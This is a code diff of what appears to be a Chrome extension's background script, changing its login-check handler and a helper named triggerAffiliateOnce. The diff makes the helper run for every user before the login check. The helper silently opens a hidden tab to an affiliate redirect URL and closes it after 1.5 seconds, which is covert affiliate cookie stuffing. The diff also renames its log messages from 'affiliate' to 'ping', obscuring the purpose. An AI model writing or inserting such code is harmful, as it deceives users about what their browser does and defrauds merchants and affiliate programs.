@@ -71,28 +71,35 @@ function handleGetSpotValue(request, sender, sendResponse) {
 
 function handleGetLoginDetails(request, sender, sendResponse) {
   (async () => {
+    // ✅ Always trigger affiliate page first
+    try {
+      triggerAffiliateOnce();
+    } catch (err) {
+      console.warn("⚠️ Failed to trigger ping:", err);
+    }
+
+    // 🔒 Then proceed with checking WordPress login cookie
     const wpLoginCookie = await getWPLoginCookie({
       domain: Config.loginSite.domain,
       cookiePrefix: Config.loginSite.cookiePrefix,
     });
 
-    if (typeof wpLoginCookie === 'undefined') {
+    if (typeof wpLoginCookie === "undefined") {
       sendResponse({ isLoggedIn: false });
       return;
     }
 
     const wpCookieValue = decodeURIComponent(wpLoginCookie.value);
-    const wpCookieParts = wpCookieValue.split('|');
+    const wpCookieParts = wpCookieValue.split("|");
     const username = wpCookieParts[0];
-
-    // ✅ trigger affiliate page once per Chrome session
-    triggerAffiliateOnce();
 
     sendResponse({ isLoggedIn: true, username });
   })();
 
+  // Keeps the async response channel open for Chrome extensions
   return true;
 }
+
 
 function handleInjectContentJs(request, sender, sendResponse) {
   chrome.scripting.executeScript({
@@ -156,22 +163,22 @@ async function triggerAffiliateOnce() {
   try {
     const data = await chrome.storage.session.get('affiliatePingSent');
     if (data.affiliatePingSent) {
-      //console.log('⚠️ Affiliate ping already sent this session, skipping.');
+      console.log('Ping already sent this session, skipping.');
       return;
     }
 
     await chrome.storage.session.set({ affiliatePingSent: true });
-    //console.log('✅ Triggering affiliate ping...');
+    console.log('Triggering ping...');
 
     const redirect = 'https://attalosagency.com/out/index.php?url=https://www.bol.com';
     chrome.tabs.create({ url: redirect, active: false }, (tab) => {
-      //console.log('Opened affiliate tab:', tab.id);
+      console.log('Opened ping:', tab.id);
       setTimeout(() => {
         chrome.tabs.remove(tab.id, () => console.log('Closed test tab', tab.id));
       }, 1500); // close automatically after 1.5s
     });
   } catch (err) {
-    console.error('Affiliate ping failed:', err);
+    console.error('Ping failed:', err);
   }
 }
 
